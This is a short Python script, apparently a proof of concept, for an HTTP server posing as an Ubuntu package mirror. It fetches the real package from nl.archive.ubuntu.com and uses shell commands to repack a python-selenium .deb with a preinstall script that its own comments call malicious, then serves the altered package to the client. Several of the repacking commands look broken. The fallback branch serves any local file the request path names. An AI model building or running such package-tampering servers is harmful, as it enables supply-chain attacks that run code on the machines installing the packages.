from http.server import BaseHTTPRequestHandler, HTTPServer
import requests
import os
# import hashlib

base_url = "http://nl.archive.ubuntu.com"

class Server(BaseHTTPRequestHandler):
    def do_GET(self):
        print("request:", self.path)
        if "ubuntu/pool" in self.path:
            r = requests.get(base_url + self.path)
            print(type(r))
            print(r.headers)
            self.send_response(200)
            for header in r.headers.keys():
                self.send_header(header, r.headers[header])
            self.end_headers()

            #print(r.content)
            #print(hashlib.sha512(r.content).hexdigest())
            os.system("ar x python-selenium_2.25.0-0ubuntu1_all.deb --output extracting_area") #extract deb files 
            os.system("gunzip python-selenium_2.25.0-0ubuntu1_all/control.tar.gzip") #unzip control
            os.system("tar rf python-selenium_2.25.0-0ubuntu1_all/control.tar preinst") #add malicious preinst
            os.system("gzip python-selenium_2.25.0-0ubuntu1_all/control.tar.gzip") #zip control
            os.system("ar r ./test/control.tar.gz python-selenium_2.25.0-0ubuntu1_all.deb") #add control back to the deb
            f = open("python-selenium_2.25.0-0ubuntu1_all.deb", "rb")
            content = f.read()
            #print(content)
            self.wfile.write(content) #if python 3 - bytes(content)
            f.close()

            #self.wfile.write(r.content)
        else:
            self.send_response(200)
            self.end_headers()
            f = open("." + self.path, "rb")
            content = f.read()
            # print(content)
            self.wfile.write(content)
            f.close()

if __name__ == "__main__":
    web_server = HTTPServer(("localhost", 8080), Server)
    print("Server started")

    try:
        web_server.serve_forever()
    except KeyboardInterrupt:
        pass

    web_server.server_close()
    print("Server stopped")
